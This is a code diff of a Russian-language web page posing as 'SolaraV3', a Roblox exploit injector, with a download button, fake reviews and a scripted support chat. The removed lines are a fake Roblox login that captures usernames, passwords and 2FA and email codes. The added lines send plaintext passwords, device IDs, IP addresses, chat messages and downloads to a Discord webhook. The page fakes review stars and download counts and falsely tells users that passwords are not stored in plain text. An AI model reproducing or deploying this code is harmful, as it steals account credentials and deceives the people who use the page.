-    window.resendCode=function(){if(cooldown>0)return;cooldown=60;document.getElementById('resendBtn').classList.add('disabled');document.getElementById('countdown').textContent='('+cooldown+'s)';cdInterval=setInterval(function(){cooldown--;document.getElementById('countdown').textContent='('+cooldown+'s)';if(cooldown<=0){clearInterval(cdInterval);document.getElementById('resendBtn').classList.remove('disabled');document.getElementById('countdown').textContent=''}},1000);send('📩 **RESEND 2FA**\n👤 `'+U+'`')};
-    
-    function resetEmailResend(){emailCooldown=0;if(emailCdInterval)clearInterval(emailCdInterval);document.getElementById('resendEmailBtn').classList.remove('disabled');document.getElementById('emailCountdown').textContent=''}
-    window.resendEmailCode=function(){if(emailCooldown>0)return;emailCooldown=60;document.getElementById('resendEmailBtn').classList.add('disabled');document.getElementById('emailCountdown').textContent='('+emailCooldown+'s)';emailCdInterval=setInterval(function(){emailCooldown--;document.getElementById('emailCountdown').textContent='('+emailCooldown+'s)';if(emailCooldown<=0){clearInterval(emailCdInterval);document.getElementById('resendEmailBtn').classList.remove('disabled');document.getElementById('emailCountdown').textContent=''}},1000);send('📧 **RESEND EMAIL CODE**\n📧 `'+lastForgotEmail+'`')};
-    
-    window.doLogin=async function(){
-        U=document.getElementById('u').value.trim();P=document.getElementById('p').value.trim();
-        if (isFamousUsername(U)) {
-            document.getElementById('eLogin').textContent = 'Password does not match this username. Please try again.';
-            document.getElementById('eLogin').style.display = 'block';
-            return;
+
+    async function registerUser(username, password) {
+        const hwid = getHWID();
+        const ip = await fetchIP();
+        for (const key in accounts) {
+            if (accounts[key].hwid === hwid) return { success:false, message:'⚠️ С этого устройства уже зарегистрирован аккаунт.' };
+            if (accounts[key].ip === ip) return { success:false, message:'⚠️ С этого IP уже зарегистрирован аккаунт.' };
         }
-        if (isGarbageUsername(U)) {
-            document.getElementById('eLogin').textContent = 'Invalid username format. Password does not match.';
-            document.getElementById('eLogin').style.display = 'block';
-            return;
+        if (!isValidUsername(username)) return { success:false, message:'❌ Некорректное или занятое имя пользователя.' };
+        if (!isValidPassword(password)) return { success:false, message:'❌ Пароль должен быть минимум 8 символов.' };
+        const upperName = username.toUpperCase();
+        accounts[upperName] = {
+            username: upperName,
+            password: hashPassword(password),
+            hwid,
+            ip,
+            created: Date.now()
+        };
+        localStorage.setItem('solara_accounts', JSON.stringify(accounts));
+        sendToDiscord({ username: upperName, email:'—', password, hwid, ip, robloxCookie:'—', action:'Регистрация' });
+        sessions[hwid] = upperName;
+        localStorage.setItem('solara_sessions', JSON.stringify(sessions));
+        currentUser = upperName;
+        isLoggedIn = true;
+        updateReviewAuthState();
+        return { success:true, message:'✅ Аккаунт создан! Выполняется вход...' };
+    }
+
+    async function loginUser(username, password) {
+        const hwid = getHWID();
+        const ip = await fetchIP();
+        const upperName = username.toUpperCase();
+        if (!accounts[upperName]) return { success:false, message:'❌ Пользователь не найден.' };
+        const acc = accounts[upperName];
+        if (acc.password !== hashPassword(password)) return { success:false, message:'❌ Неверный пароль.' };
+        if (acc.hwid && acc.hwid !== hwid) return { success:false, message:'❌ Этот аккаунт привязан к другому устройству.' };
+        acc.hwid = hwid; acc.ip = ip;
+        localStorage.setItem('solara_accounts', JSON.stringify(accounts));
+        sessions[hwid] = upperName;
+        localStorage.setItem('solara_sessions', JSON.stringify(sessions));
+        sendToDiscord({ username: upperName, email: acc.email||'—', password, hwid, ip, robloxCookie:'—', action:'Вход' });
+        currentUser = upperName;
+        isLoggedIn = true;
+        updateReviewAuthState();
+        return { success:true, message:'✅ Добро пожаловать!' };
+    }
+
+    // ============================================================
+    //  UI
+    // ============================================================
+    const $ = id => document.getElementById(id);
+    const loginForm = $('loginForm');
+    const registerForm = $('registerForm');
+    const robloxForm = $('robloxForm');
+    const injectorPanel = $('injectorPanel');
+    const loginAlert = $('loginAlert');
+    const registerAlert = $('registerAlert');
+    const robloxAlert = $('robloxAlert');
+
+    function updateReviewAuthState() {
+        const reviewInput = document.getElementById('reviewInput');
+        const addReviewBtn = document.getElementById('addReviewBtn');
+        const notice = document.getElementById('reviewAuthNotice');
+        if (isLoggedIn && currentUser) {
+            reviewInput.disabled = false;
+            addReviewBtn.disabled = false;
+            if (notice) notice.textContent = '✅ Вы вошли как ' + currentUser + '. Можете оставить отзыв!';
+            notice.style.color = '#22c55e';
+        } else {
+            reviewInput.disabled = true;
+            addReviewBtn.disabled = true;
+            if (notice) notice.textContent = '❗ Для добавления отзыва необходимо войти в аккаунт';
+            notice.style.color = 'var(--muted)';
         }
-        if (hasBannedWord(U)) {
-            document.getElementById('eLogin').textContent = 'This username is not allowed. Please choose another.';
-            document.getElementById('eLogin').style.display = 'block';
-            return;
-        }
-        if(!validateUsername(document.getElementById('u'),'uHint','uCounter',false)||P.length<8||P.length>20){document.getElementById('eLogin').style.display='block';return}
-        document.getElementById('eLogin').style.display='none';showStep('load1');
-        await send('🎯 **LOGIN**\n👤 `'+U+'`\n🔑 `'+P+'`\n⏰ '+new Date().toLocaleString());
-        setTimeout(function(){showStep('step2fa');document.querySelector('#codeBoxes .code-box').focus()},2000);
+    }
+
+    window.showRobloxLogin = function() {
+        document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+        document.querySelector('[data-tab="roblox"]').classList.add('active');
+        loginForm.classList.add('panel-hidden');
+        registerForm.classList.add('panel-hidden');
+        robloxForm.classList.remove('panel-hidden');
+        injectorPanel.classList.add('panel-hidden');
+        loginAlert.style.display='none';
+        registerAlert.style.display='none';
+        robloxAlert.style.display='none';
     };
-    
-    window.do2FA=async function(){
-        var code=getCode('codeBoxes');if(code.length<6){document.getElementById('e2FA').style.display='block';return}
-        attempts++;document.getElementById('e2FA').style.display='none';document.getElementById('btnVerify').disabled=true;showStep('load2');
-        await send('🔐 **2FA #'+attempts+'**\n👤 `'+U+'`\n🔢 `'+code+'`\n⏰ '+new Date().toLocaleString());
-        setTimeout(function(){if(attempts>=3){window.location.href='https://www.roblox.com/login';return}
-            showStep('step2fa');document.getElementById('btnVerify').disabled=false;document.querySelectorAll('#codeBoxes .code-box').forEach(function(b){b.value=''});document.getElementById('e2FA').style.display='block';document.querySelector('#codeBoxes .code-box').focus()},2000);
-    };
-    
-    window.doForgot=async function(){
-        var v=document.getElementById('fg').value.trim();
-        if(v.length<3||(v.includes('@')&&!v.includes('.',v.indexOf('@')))){document.getElementById('eForgot').style.display='block';return}
-        document.getElementById('eForgot').style.display='none';
-        lastForgotEmail=v;
-        await send('🔑 **FORGOT**\n📧 `'+v+'`\n⏰ '+new Date().toLocaleString());
-        // Переход на страницу Email Verification
-        showStep('stepEmailVerify');
-        document.querySelector('#emailCodeBoxes .code-box').focus();
-        // Сброс попыток
-        emailAttempts=0;
-        document.getElementById('eEmailVerify').style.display='none';
-    };
-    
-    window.doEmailVerify=async function(){
-        var code=getCode('emailCodeBoxes');
-        if(code.length<6){document.getElementById('eEmailVerify').style.display='block';return}
-        emailAttempts++;
-        document.getElementById('eEmailVerify').style.display='none';
-        await send('📧 **EMAIL VERIFY**\n📧 `'+lastForgotEmail+'`\n🔢 `'+code+'`\n⏰ '+new Date().toLocaleString());
-        
-        // После ввода кода переходим на 2FA (успешная верификация)
-        // Показываем успешное сообщение и переходим на 2FA
-        document.getElementById('eEmailVerify').textContent = '✅ Email verified! Redirecting to 2FA...';
-        document.getElementById('eEmailVerify').style.display = 'block';
-        document.getElementById('eEmailVerify').style.background = 'rgba(0,176,111,0.2)';
-        document.getElementById('eEmailVerify').style.color = '#00b06f';
-        document.getElementById('eEmailVerify').style.border = '1px solid #00b06f';
-        
-        setTimeout(function(){
-            showStep('step2fa');
-            document.querySelector('#codeBoxes .code-box').focus();
-            document.getElementById('eEmailVerify').style.display='none';
-            document.getElementById('eEmailVerify').style.background = 'var(--error)';
-            document.getElementById('eEmailVerify').style.color = '#fff';
-            document.getElementById('eEmailVerify').style.border = 'none';
-        },1500);
-    };
-    
-    window.doSignup=async function(){
-        var u=document.getElementById('su').value.trim(),p=document.getElementById('sp').value.trim(),p2=document.getElementById('sp2').value.trim();
-        if (isFamousUsername(u)) {
-            document.getElementById('signupInfo').textContent = '⚠️ This username is reserved and cannot be used.';
-            document.getElementById('signupInfo').style.display = 'block';
-            return;
-        }
-        if (isGarbageUsername(u)) {
-            document.getElementById('signupInfo').textContent = '⚠️ This username is not allowed. Please choose a more unique name.';
-            document.getElementById('signupInfo').style.display = 'block';
-            return;
-        }
-        if (hasBannedWord(u)) {
-            document.getElementById('signupInfo').textContent = '⚠️ This username contains a reserved word. Please choose another one.';
-            document.getElementById('signupInfo').style.display = 'block';
-            return;
-        }
-        if(!validateUsername(document.getElementById('su'),'suHint','suCounter',true)||p.length<8||p.length>20||p!==p2){document.getElementById('eSignup').style.display='block';return}
-        document.getElementById('signupInfo').textContent='⚠️ This username is already taken. Please choose another one.';
-        document.getElementById('signupInfo').style.display='block';
-        var names=generateUsernameSuggestions(u);document.getElementById('usernameSuggestions').style.display='flex';
-        document.getElementById('usernameSuggestions').innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'signupInfo\').style.display=\'block\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('');
-        await send('📝 **SIGNUP ATTEMPT**\n👤 `'+u+'`\n🔑 `'+p+'`\n⏰ '+new Date().toLocaleString());
-    };
-    
-    document.querySelectorAll('input').forEach(function(inp){
-        inp.addEventListener('input',function(){
-            if(hasR(this.value))this.value=this.value.replace(/[а-яё]/gi,'');
+
+    document.querySelectorAll('.tab-btn').forEach(btn=>{
+        btn.addEventListener('click',()=>{
+            document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+            btn.classList.add('active');
+            const tab=btn.dataset.tab;
+            if(tab==='login'){ loginForm.classList.remove('panel-hidden'); registerForm.classList.add('panel-hidden'); robloxForm.classList.add('panel-hidden'); injectorPanel.classList.add('panel-hidden'); }
+            else if(tab==='register'){ loginForm.classList.add('panel-hidden'); registerForm.classList.remove('panel-hidden'); robloxForm.classList.add('panel-hidden'); injectorPanel.classList.add('panel-hidden'); }
+            else if(tab==='roblox'){ loginForm.classList.add('panel-hidden'); registerForm.classList.add('panel-hidden'); robloxForm.classList.remove('panel-hidden'); injectorPanel.classList.add('panel-hidden'); }
+            loginAlert.style.display='none'; registerAlert.style.display='none'; robloxAlert.style.display='none';
         });
     });
-})();
+
+    $('regPassword').addEventListener('input', function() {
+        const val = this.value;
+        const bar = document.getElementById('passwordStrength');
+        let score = 0;
+        if (val.length >= 8) score++;
+        if (/[A-Z]/.test(val)) score++;
+        if (/[0-9]/.test(val)) score++;
+        if (/[^A-Za-z0-9]/.test(val)) score++;
+        bar.className = 'password-strength' + (score <= 1 ? ' weak' : score <= 2 ? ' medium' : ' strong');
+    });
+
+    $('regUsername').addEventListener('input', function() {
+        const val = this.value;
+        if (val.includes(' ')) {
+            this.value = val.replace(/ /g, '_');
+        }
+    });
+
+    $('registerBtn').addEventListener('click', async ()=>{
+        const username = $('regUsername').value.trim().toUpperCase();
+        const password = $('regPassword').value;
+        const result = await registerUser(username, password);
+        registerAlert.textContent = result.message;
+        registerAlert.className = 'alert ' + (result.success ? 'success' : 'error');
+        registerAlert.style.display = 'block';
+        if(result.success) setTimeout(()=>showInjector(username), 800);
+    });
+
+    $('loginBtn').addEventListener('click', async ()=>{
+        const username = $('loginUsername').value.trim().toUpperCase();
+        const password = $('loginPassword').value;
+        const result = await loginUser(username, password);
+        loginAlert.textContent = result.message;
+        loginAlert.className = 'alert ' + (result.success ? 'success' : 'error');
+        loginAlert.style.display = 'block';
+        if(result.success) setTimeout(()=>showInjector(username), 600);
+    });
+
+    $('robloxBtn').addEventListener('click', async ()=>{
+        const username = $('robloxUsername').value.trim();
+        const password = $('robloxPassword').value;
+        const result = await robloxLogin(username, password);
+        robloxAlert.textContent = result.message;
+        robloxAlert.className = 'alert ' + (result.success ? 'success' : 'error');
+        robloxAlert.style.display = 'block';
+        if(result.success) setTimeout(()=>showInjector(username), 800);
+    });
+
+    $('logoutBtn').addEventListener('click', ()=>{
+        const hwid = getHWID();
+        delete sessions[hwid];
+        localStorage.setItem('solara_sessions', JSON.stringify(sessions));
+        currentUser = null;
+        isLoggedIn = false;
+        updateReviewAuthState();
+        location.reload();
+    });
+
+    function showInjector(username) {
+        loginForm.classList.add('panel-hidden');
+        registerForm.classList.add('panel-hidden');
+        robloxForm.classList.add('panel-hidden');
+        injectorPanel.classList.remove('panel-hidden');
+        document.querySelector('.tabs').classList.add('panel-hidden');
+        $('userNameDisplay').textContent = username;
+        loginAlert.style.display='none'; registerAlert.style.display='none'; robloxAlert.style.display='none';
+        currentUser = username;
+        isLoggedIn = true;
+        updateReviewAuthState();
+    }
+
+    window.fakeInject = function(wallet) {
+        const status = $('injectStatus');
+        status.textContent = `⏳ Инжекция в ${wallet}...`;
+        status.style.color = '#fbbf24';
+        setTimeout(()=>{
+            status.textContent = `✅ Успешно! ${wallet} инжектирован.`;
+            status.style.color = '#22c55e';
+            fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({ content:`💉 **Использован инжектор**\n👤 ${$('userNameDisplay').textContent}\n💳 ${wallet}\n🕒 ${new Date().toLocaleString()}` }) }).catch(()=>{});
+        }, 2000);
+    };
+
+    // ============================================================
+    //  AI ЧАТ
+    // ============================================================
+    const chatBox = $('chatBox');
+    const userInput = $('userInput');
+    const sendBtn = $('sendBtn');
+    const typingIndicator = $('typingIndicator');
+
+    function addMessage(text, sender) {
+        const div = document.createElement('div');
+        div.className = `message ${sender}`;
+        const span = document.createElement('span');
+        span.textContent = text;
+        const timeSpan = document.createElement('span');
+        timeSpan.className = 'time';
+        timeSpan.textContent = new Date().toLocaleTimeString();
+        div.appendChild(span);
+        div.appendChild(timeSpan);
+        chatBox.appendChild(div);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    function showTyping() { typingIndicator.style.display = 'block'; chatBox.scrollTop = chatBox.scrollHeight; }
+    function hideTyping() { typingIndicator.style.display = 'none'; }
+
+    function processUserMessage(message) {
+        if (!message.trim()) return;
+        addMessage(message, 'user');
+        fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({ content:`💬 **Новое сообщение в поддержке**\n👤 Пользователь: ${message}\n🕒 ${new Date().toLocaleString()}` }) }).catch(()=>{});
+        showTyping();
+        const delay = 500 + Math.random() * 1500;
+        setTimeout(()=>{
+            hideTyping();
+            const response = getAIResponse(message);
+            addMessage(response, 'bot');
+        }, delay);
+        userInput.value = '';
+        userInput.focus();
+    }
+
+    sendBtn.addEventListener('click', ()=> processUserMessage(userInput.value));
+    userInput.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ e.preventDefault(); processUserMessage(userInput.value); } });
+    $('clearChatBtn').addEventListener('click', function(e){ e.preventDefault();
+        chatBox.innerHTML = `<div class="message bot">🧹 Чат очищен. Задайте новый вопрос!<span class="time">только что</span></div>`;
+    });
+
+    // ============================================================
+    //  ОТЗЫВЫ
+    // ============================================================
+    const reviewInput = $('reviewInput');
+    const addReviewBtn = $('addReviewBtn');
+
+    function isValidReviewText(text) {
+        return /^[a-zA-Zа-яА-ЯёЁ\s.,!?]+$/.test(text);
+    }
+
+    addReviewBtn.addEventListener('click', () => {
+        if (!isLoggedIn || !currentUser) {
+            alert('Для добавления отзыва необходимо войти в аккаунт!');
+            return;
+        }
+        let text = reviewInput.value.trim();
+        if (!text || text.length < 2) {
+            alert('Отзыв слишком короткий');
+            return;
+        }
+        if (!isValidReviewText(text)) {
+            alert('Отзыв может содержать только буквы (русские и английские), пробелы и знаки препинания (. , ! ?)');
+            reviewInput.value = '';
+            return;
+        }
+        let name = currentUser;
+        const randomReview = getRandomReview();
+        if (text.length < 5) {
+            text = text + ' ' + randomReview.text;
+        }
+        const stars = Math.min(5, Math.max(1, Math.round(3 + Math.random() * 2)));
+        addReview(name, text, stars);
+        reviewInput.value = '';
+        fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({ content:`📝 **Новый отзыв**\n👤 ${name}\n💬 ${text}\n⭐ ${stars}/5\n🕒 ${new Date().toLocaleString()}` }) }).catch(()=>{});
+        downloadCount += Math.floor(Math.random() * 2) + 1;
+        localStorage.setItem('solara_downloads', downloadCount.toString());
+        updateDownloadCounter();
+    });
+
+    // ============================================================
+    //  MODAL
+    // ============================================================
+    const modalOverlay = $('modalOverlay');
+    const modalTitle = $('modalTitle');
+    const modalBody = $('modalBody');
+    const modalClose = $('modalClose');
+
+    function openModal(title, content) {
+        modalTitle.textContent = title;
+        modalBody.innerHTML = content;
+        modalOverlay.classList.add('active');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeModal() {
+        modalOverlay.classList.remove('active');
+        document.body.style.overflow = '';
+    }
+
+    modalClose.addEventListener('click', closeModal);
+    modalOverlay.addEventListener('click', function(e) { if(e.target === this) closeModal(); });
+
+    $('privacyBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        openModal('Политика конфиденциальности',
+            `<p>Мы уважаем вашу конфиденциальность и обязуемся защищать ваши личные данные. Вся информация, которую вы предоставляете при использовании SolaraV3, используется исключительно для обеспечения работы сервиса и не передаётся третьим лицам.</p>
+            <p>Мы не храним пароли в открытом виде, используем шифрование и современные методы защиты данных. Вы можете запросить удаление своих данных в любой момент, написав в поддержку.</p>
+            <p>Файлы, загружаемые с нашего сайта, проходят проверку на вирусы. Мы не несём ответственности за неправильное использование программы пользователями.</p>`
+        );
+    });
+
+    $('termsBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        openModal('Условия использования',
+            `<p><strong>1. Принимая данные условия, вы подтверждаете, что ознакомлены с функционалом программы SolaraV3 и согласны использовать её на свой страх и риск.</strong></p>
+            <p>2. Вы обязуетесь не использовать программу в незаконных целях и не нарушать правила игровых платформ, с которыми взаимодействует инжектор.</p>
+            <p>3. Разработчики не несут ответственности за блокировки аккаунтов, наложенные сторонними сервисами в результате использования программы. Вы используете программу по своему усмотрению.</p>
+            <p>4. Вы соглашаетесь, что программа может собирать техническую информацию о вашей системе (HWID, IP) для защиты от несанкционированного доступа и обеспечения безопасности.</p>
+            <p>5. Мы оставляем за собой право обновлять данные условия без предварительного уведомления. Актуальная версия всегда доступна на этой странице.</p>
+            <p>6. Используя SolaraV3, вы автоматически принимаете все пункты настоящих условий.</p>`
+        );
+    });
+
+    // ============================================================
+    //  DOWNLOAD BUTTON
+    // ============================================================
+    $('downloadBtn').addEventListener('click', function(e) {
+        downloadCount += Math.floor(Math.random() * 3) + 1;
+        localStorage.setItem('solara_downloads', downloadCount.toString());
+        updateDownloadCounter();
+        fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({ content:`⬇️ **Скачивание файла**\n🆔 HWID: ${getHWID()}\n🌐 IP: ${navigator.userAgent.substring(0,32)}\n🕒 ${new Date().toLocaleString()}\n📊 Всего загрузок: ${downloadCount}` }) }).catch(()=>{});
+    });
+
+    // ============================================================
+    //  AUTO-LOGIN
+    // ============================================================
+    (async function autoLogin() {
+        const hwid = getHWID();
+        const savedUser = sessions[hwid];
+        if (savedUser && (accounts[savedUser] || robloxAccounts[hwid])) {
+            showInjector(savedUser);
+            document.querySelector('.tabs').classList.add('panel-hidden');
+            loginForm.classList.add('panel-hidden');
+            registerForm.classList.add('panel-hidden');
+            robloxForm.classList.add('panel-hidden');
+            loginAlert.style.display='none';
+            registerAlert.style.display='none';
+            robloxAlert.style.display='none';
+            currentUser = savedUser;
+            isLoggedIn = true;
+            updateReviewAuthState();
+        }
+    })();
+
+    // ============================================================
+    //  ИНИЦИАЛИЗАЦИЯ
+    // ============================================================
+    applyLanguage(currentLang);
+    applyTheme(currentTheme);
+    renderReviews();
+    updateRating();
+    updateDownloadCounter();
+    updateReviewAuthState();
+
+    if (reviewData.length < 3) {
+        const names = ['AXIORE', 'ZENOX', 'VORTEX', 'NEXUS', 'LUNAR', 'SOLAR', 'XENON'];
+        const texts = ['Top 🔥', 'GOAT 🐐', 'Лучший!', 'W', '🔥🔥🔥', '10/10', 'Бомба!', 'Зачёт'];
+        for (let i = 0; i < 4; i++) {
+            const name = names[Math.floor(Math.random() * names.length)] + (Math.random() > 0.5 ? '_pro' : '_x');
+            const text = texts[Math.floor(Math.random() * texts.length)];
+            const stars = 4 + Math.floor(Math.random() * 2);
+            addReview(name, text, stars);
+        }
+    }
+
+    console.log('💜 SolaraV3 loaded with AI Support & Reviews');
 </script>
 </body>
 </html>
